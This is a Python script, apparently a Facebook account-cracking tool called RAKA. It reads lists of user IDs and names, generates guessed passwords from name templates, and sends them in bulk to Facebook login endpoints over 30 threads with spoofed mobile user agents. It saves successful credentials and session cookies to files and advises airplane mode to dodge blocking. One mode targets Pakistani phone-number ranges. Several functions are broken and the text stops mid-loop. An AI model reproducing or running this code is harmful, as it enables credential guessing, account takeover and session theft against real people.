#!/usr/bin/python
#BARKI Teach my wp 03188939326

import os,zlib

from os import system as osRUB
from os import system as cmd
os.system('clear')
print('loading Modules ...\n')

try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
    os.system('pip install requests')
    
try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')

try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')

from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
from concurrent.futures import ThreadPoolExecutor

model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()

totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []

import random
import random
import random

def generate_user_agent_2():
    device_models = [
        "RMX8122", "RMX8212", "RMX8142", "RMX8222", "RMX8252", "RMX8262", "RMX8322", "RMX8332",
        'SM-G950F', 'SM-G955F', 'SM-G960F', 'SM-G965F', 'SM-A520F', 'SM-A720F', 'SM-J710F', 'SM-J530F', 'SM-J730F',
        'SM-N950F', 'SM-G530H', 'SM-G930F', 'SM-J320F', 'SM-J500H', 'SM-A510F', 'SM-G7102', 'SM-G610F', 'SM-G925F',
        'SM-G360H', 'SM-G531H', 'SM-G900F', 'SM-J200G', 'SM-J700F', 'SM-G7102', 'SM-J500H', 'SM-A310F', 'SM-G532F',
        'SM-G900H', 'SM-J200H', 'SM-A510M', 'SM-G7106', 'SM-J700M', 'SM-A310M', 'SM-A530F', 'SM-J730GM', 'SM-G360G',
        'SM-J500M', 'SM-A810F', 'SM-G920F', 'SM-J200F', 'SM-A710M', 'SM-G610M', 'SM-G925I', 'SM-G360F', 'SM-G532M',
        'SM-G900I', 'SM-J200M', 'SM-A510M', 'SM-G7106'
    ]
    platforms_android = ["Linux; Android 8.1.0", "Linux; Android 9.0", "Linux; Android 10.0", "Linux; Android 11.0", "Linux; Android 12.0", "Linux; Android 13.0"]
    platforms_desktop = ["Windows NT 10.0", "Windows NT 6.1", "Macintosh; Intel Mac OS X 10_15_7", "Macintosh; Intel Mac OS X 11_1_0"]
    engines = ["AppleWebKit/537.36 (KHTML, like Gecko)", "Gecko/20100101 Firefox/88.0", "Trident/7.0"]
    types = ["Mobile Safari/537.36", "Safari/537.36", "MSIE 11.0"]
    languages = ["en", "fr", "es", "de"]
    regions = ["US", "PK", "CA", "FR"]
    facebook_apps = ["FB4A", "EMA", "MessengerForiOS", "MESSENGER", "MessengerLite", "MessengerLiteForiOS"]
    android_version = f"Android {random.randint(8, 13)}.0"
    facebook_app_version = f"{random.randint(80, 300)}.{random.randint(0, 9)}.{random.randint(0, 9)}.{random.randint(0, 999)}"
    platform_android = random.choice(platforms_android)
    platform_desktop = random.choice(platforms_desktop)
    engine = random.choice(engines)
    browser_type = random.choice(types)
    language = random.choice(languages)
    region = random.choice(regions)
    facebook_app = random.choice(facebook_apps)
    chrome_version = f"Chrome/{random.uniform(80.0, 120.0):.1f}"
    if "Android" in platform_android:
        platform = platform_android
    else:
        platform = platform_desktop
    # Select a random device model from the list
    device_model = random.choice(device_models)
    user_agentt = f"Mozilla/5.0 ({platform}; {device_model} Build/R{random.randint(10, 99)}NW) {engine} {chrome_version} {browser_type} [FBAN/{facebook_app};FBLC/{language}-{region};FBAV/{facebook_app_version};]"
    return user_agentt

model2= [
        "RMX8122", "RMX8212", "RMX8142", "RMX8222", "RMX8252", "RMX8262", "RMX8322", "RMX8332",'SM-G950F', 'SM-G955F', 'SM-G960F', 'SM-G965F', 'SM-A520F', 'SM-A720F', 'SM-J710F', 'SM-J530F', 'SM-J730F',
        'SM-N950F', 'SM-G530H', 'SM-G930F', 'SM-J320F', 'SM-J500H', 'SM-A510F', 'SM-G7102', 'SM-G610F', 'SM-G925F',
        'SM-G360H', 'SM-G531H', 'SM-G900F', 'SM-J200G', 'SM-J700F', 'SM-G7102', 'SM-J500H', 'SM-A310F', 'SM-G532F',
        'SM-G900H', 'SM-J200H', 'SM-A510M', 'SM-G7106', 'SM-J700M', 'SM-A310M', 'SM-A530F', 'SM-J730GM', 'SM-G360G',
        'SM-J500M', 'SM-A810F', 'SM-G920F', 'SM-J200F', 'SM-A710M', 'SM-G610M', 'SM-G925I', 'SM-G360F', 'SM-G532M',
        'SM-G900I', 'SM-J200M', 'SM-A510M', 'SM-G7106'
    ]
def randBuildLSB():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.kaRAKAna;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

def randBuildvsskj():
    END = '[FBAN/EMA;FBBV/352223683;FBAV/291.0.0.12.110;FBDV/SM-G935FD;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ual
def random_user_agent():
    # List of Android versions
    android_versions = [f"Android {i}" for i in range(6, 14)]

    # List of device models
    device_models = [
        "RMX8122", "RMX8212", "RMX8142", "RMX8222", "RMX8252", "RMX8262", "RMX8322", "RMX8332",'SM-G950F', 'SM-G955F', 'SM-G960F', 'SM-G965F', 'SM-A520F', 'SM-A720F', 'SM-J710F', 'SM-J530F', 'SM-J730F',
        'SM-N950F', 'SM-G530H', 'SM-G930F', 'SM-J320F', 'SM-J500H', 'SM-A510F', 'SM-G7102', 'SM-G610F', 'SM-G925F',
        'SM-G360H', 'SM-G531H', 'SM-G900F', 'SM-J200G', 'SM-J700F', 'SM-G7102', 'SM-J500H', 'SM-A310F', 'SM-G532F',
        'SM-G900H', 'SM-J200H', 'SM-A510M', 'SM-G7106', 'SM-J700M', 'SM-A310M', 'SM-A530F', 'SM-J730GM', 'SM-G360G',
        'SM-J500M', 'SM-A810F', 'SM-G920F', 'SM-J200F', 'SM-A710M', 'SM-G610M', 'SM-G925I', 'SM-G360F', 'SM-G532M',
        'SM-G900I', 'SM-J200M', 'SM-A510M', 'SM-G7106'
    ]
    fb_app_versions = [f"FB4A;FBAV/{random.randint(100, 400)}.0.0.{random.randint(10, 99)}" for _ in range(5)]
    android_version = random.choice(android_versions)
    device_model = random.choice(device_models)
    fb_app_version = random.choice(fb_app_versions)
    language_code = ''.join(random.choice(string.ascii_lowercase) for _ in range(2))
    language_code += '_'
    language_code += ''.join(random.choice(string.ascii_uppercase) for _ in range(2))
    build_version = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))
    user_agent = f'Dalvik/2.1.0 (Linux; U; {android_version}; {device_model} Build/{build_version}) '
    user_agent += f'[FBAN/{fb_app_version};FBPN/com.facebook.katana;FBLC/{language_code};FBMF/{device_model};'
    user_agent += f'FBDV/{device_model};FBSV/{android_version};FB_FW/1;]'
    return user_agent
def randua():
    samsung_models = [
        'SM-G950F', 'SM-G955F', 'SM-G960F', 'SM-G965F', 'SM-A520F', 'SM-A720F', 'SM-J710F', 'SM-J530F', 'SM-J730F',
        'SM-N950F', 'SM-G530H', 'SM-G930F', 'SM-J320F', 'SM-J500H', 'SM-A510F', 'SM-G7102', 'SM-G610F', 'SM-G925F',
        'SM-G360H', 'SM-G531H', 'SM-G900F', 'SM-J200G', 'SM-J700F', 'SM-G7102', 'SM-J500H', 'SM-A310F', 'SM-G532F',
        'SM-G900H', 'SM-J200H', 'SM-A510M', 'SM-G7106', 'SM-J700M', 'SM-A310M', 'SM-A530F', 'SM-J730GM', 'SM-G360G',
        'SM-J500M', 'SM-A810F', 'SM-G920F', 'SM-J200F', 'SM-A710M', 'SM-G610M', 'SM-G925I', 'SM-G360F', 'SM-G532M',
        'SM-G900I', 'SM-J200M', 'SM-A510M', 'SM-G7106'
    ]

    infinix_models = [
        'Infinix Note 10', 'Infinix Hot 10', 'Infinix Zero 8', 'Infinix S5 Pro', 'Infinix Note 7', 'Infinix Hot 9',
        'Infinix Zero 6', 'Infinix S4', 'Infinix Note 5', 'Infinix Hot 8', 'Infinix Zero 5', 'Infinix S3X',
        'Infinix Note 4', 'Infinix Hot 7', 'Infinix Zero 4', 'Infinix S2 Pro', 'Infinix Note 3', 'Infinix Hot 6 Pro',
        'Infinix Zero 3', 'Infinix S2', 'Infinix Note 2', 'Infinix Hot 5', 'Infinix Zero 2', 'Infinix S',
        'Infinix Note 8', 'Infinix Hot 10S', 'Infinix Smart 5', 'Infinix Note 8i', 'Infinix Hot 10T'
    ]
    android_versions = [str(i) for i in range(6, 14)]
    facebook_packages = ['com.facebook.katana', 'com.facebook.orca']   
    samsung_model = random.choice(samsung_models)
    infinix_model = random.choice(infinix_models)
    android_version = random.choice(android_versions)
    facebook_package = random.choice(facebook_packages)
    fb_language = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(2)) + '_' + ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(2))
    fb_build_version = random.randint(410000000,499999999)
    uata = f'Dalvik/2.1.0 (Linux; U; Android {android_version}; {infinix_models} Build/R{random.randint(10, 99)}NW) [FBAN/Orca-Android;FBAV/196.0.0.{random.randint(10, 99)};FBPN/{facebook_package};FBLC/{fb_language};FBBV/{fb_build_version};FBCR/AIS;FBMF/{infinix_model};FBBD/{infinix_model};FBDV/{infinix_models};FBSV/{android_version};FBCA/armeabi-v7a:armeabi;FBDM/{{density={random.uniform(2.0, 4.0):.1f},width={random.randint(720, 1440)},height={random.randint(1280, 2560)}}};FB_FW/1;]'    
    return uata
    
ugen=[]
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; Android'
	bb=random.choice(['9','10','11','12','13','8.1.0'])
	cc='A201OP Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	dd=random.randrange(40,150)
	ee='0'
	ff=random.randrange(3000,6000)
	gg=random.randrange(20,100)
	hh='Mobile Safari/537.36'
	uaku2=(f'{aa} {bb}; {cc}{dd}.{ee}.{ff}.{gg} {hh}')
	ugen.append(uaku2)
#'[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.kaRAKAna;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
sys.stdout.write('\x1b]2; RAKA\x07')
GREEN ='\x1b[38;5;46m'
Y = '\033[1;33m' 
Q = '\033[1;31m'
T = '\033[1;34m'
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
logo = ("""                                           
\033[38;5;208m       ######     #    #    #    #                                 
\033[38;5;208m       #     #   # #   #   #    # #   
\033[38;5;208m       #     #  #   #  #  #    #   #  
  \033[38;5;208m     ######  #     # ###    #     # 
\033[38;5;208m       #   #   ####### #  #   ####### 
\033[38;5;208m       #    #  #     # #   #  #     # 
\033[38;5;208m       #     # #     # #    # #     # 
\033[38;5;208m[+]================================================
\033[38;5;208m    [+] CREATED BY   ( ͡°з ͡°)  RAKA && PASHA
\033[38;5;208m    [+] HELPER       ( ͡°з ͡°)  PASHA BAHI
\033[38;5;208m    [+] STATUS       ( ͡°з ͡°)  FREE
\033[38;5;208m    [+] TOOL VERSION ( ͡°з ͡°) \033[1;92m 1.0.3
\n[+]===================================================\033[1;37m""")


def clear():
    os.system("clear")
    print(logo)    
    
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print('\n')
        print(47*'-')
        print(' The Process has been Complete...')
        print(' total OK: %s' % str(len(oks)))
        print(' total CP: %s' % str(len(cps)))
        print(47*'-')
        input("Press enter to back RAKA Menu ")
        exit()

def RAKA():   
    os.system('clear')
    print(logo)

    print(f'[1] {Z}File Crack')
    print(f'[2] {Z}Random Crack ')
    print(f'[3] {Z}Remove Trash Files ')
    print(f'[4] {Z}Separate Ids')
    print(f'[5] {Z}Remove Duplicate IDs')
    print(f'{Z}[WA] Join Whatsapp Group ')
    print(f'{Z}[FA] Join Facebook Group ')
    print('')
    select = input('Select Menu>: ')
    if select =='1':
        method_crack()
    elif select =='2':
        random_num()
    elif select =='3':
       removef()
    elif select =='4':
       sids()
    elif select =='5':
       cutter()
    elif select =='wa':
        os.system('xdg-open https://chat.whatsapp.com/LYiEubRPM0lABlmcaW470F')
        pass
    elif select =='fa':
       os.system('xdg-open https://chat.whatsapp.com/LYiEubRPM0lABlmcaW470F')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        RAKA(allkey)
        
def method_crack():
    global methods
    clear()
    print(f'[1] Method {1}')
    print(f'[2] Method {2}')
    print(f'[3] Method {3}')
   # print(f'[4] Method {4}')
    print(f'[0] Back')
    print('')
    option = input('Select method>: ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodC')
        main_crack().crack(id)
    #elif option =='4':
        methods.append('methodD')
        main_crack().crack(id)
    elif option =='0':
        RAKA()
    else:
      print('\n Select Valid Option ...')
      time.sleep(2)
      method_crack()

class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        self.file = input('Put File Name : ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('Opps File Not Found ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('Try Again ...')
            time.sleep(2)
            main_crack().crack(id)
            
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RAKA] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': random_user_agent(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RAKAb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RAKAb};{ckkk}"
                    print(f"\r{R} [RAKA-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/RAKA_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RAKA_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [RAKA-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/RAKA_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
            
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RAKA] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': randua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RAKAb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RAKAb};{ckkk}"
                    print(f"\r{R} [RAKA-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/RAKA_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RAKA_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [RAKA-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/RAKA_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(sid, name, ps)
            
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RAKA] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': random_user_agent(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RAKAb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RAKAb};{ckkk}"
                    print(f"\r{R} [RAKA-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/RAKA_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RAKA_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [RAKA-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/RAKA_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodB(sid, name, ps)

    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[RAKA] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        try:
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                session=requests.Session()
                sua = random.choice(sagent)
                getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                session.headers = {}
                session.headers.update({'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': sua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [RAKA-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/RAKA_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    print(f"\r{A} [RAKA-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/RAKA_CP.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:
                    continue
                #time.sleep(31)
            
            loop+=1
        except requests.exceptions.ConnectionError:
             self.methodD(sid, name, ps)
            
    def pasw(self):       
            pw = []
            clear()
            print('Put limit between 1 to 30')
            sl = int(input('How many password do you want to add?: '))
            os.system("clear")
            print(logo)
            print(f'{S} [Example: first123,last1122,firstlast,last,ETC]')
            print('')
            if sl =='':
                print('\n Put limit between 1 to 30')
            elif sl > 20:
                print('\nPassword limit Should Not Be Greater Than 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'Password {sr+1}: '))
            os.system("clear")
            print(logo)
            
            print(f"\r{Z}Use flight (airplane) mode before use {S}")
            print(47*"-")
            print(f'{S} total IDs : %s ' % len(self.id))
            print(f'{S} Cracking Started...')
            print(47*"-")
            with ThreadPool(max_workers=30) as RAKAworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                RAKAworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                RAKAworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                RAKAworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                RAKAworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    import os
    import random
    import string
    import requests
def cek_apk(session,coki):

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Active  Apk  ')

    else:

        print(f'\r[??] \x1b[38;5;46m ☆ Your Active Apps ☆     :{WHITE}')

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

            #created by hbf team(owner) Hamii

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Expired Apk{WHITE}')

        print(54*'-')

    else:

        print(f'\r[🎮] \x1b[38;5;196m ◇ Your Expired Apps ◇    :{WHITE}')

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

        else:

            print(57*'-')



def random_num():
    os.system('clear')  # Use 'cls' instead of 'clear' on Windows
    print(logo)  # Assuming 'logo' is defined somewhere in your code
    print("[1] PAKISTAN")
    print("[2] BANGLADESH")
    print("[3] AFGHANISTAN")
    option = input('Select Country>: ')
    if option =='1':
        pak()
    elif option =='2':
        bd()
    elif option =='3':
        afg()
    elif option =='0':
        RAKA()
    else:
      print('\n Select Valid Option ...')
      time.sleep(2)
      random_num()

def pak():
    user = []
    clear()
    print('\033[1;33m     CODE EXAMPLE 👇👇👇 \n\033[1;32m ZONG Codes: \033[1;34m         0311  0313   0315  0317 \n\033[1;32m JAZZ/WARID Codes: \033[1;34m   0300  0305   0325  0323\n\033[1;32m TELENOR Codes: \033[1;34m      0333  0335   0337  0331')
    code = input('\033[1;32m[+]PUT CODE: ')

    try:
        limit = int(input('\033[1;33mSELECT LIMIT: \n     \033[1;34m 2000, 3000, 5000, 10000\n\033[1;32m[+]LIMIT: '))
    except ValueError:
        limit = 50000

    clear()

    for nmbr in range(limit):
        # Generate three different strings with varying lengths
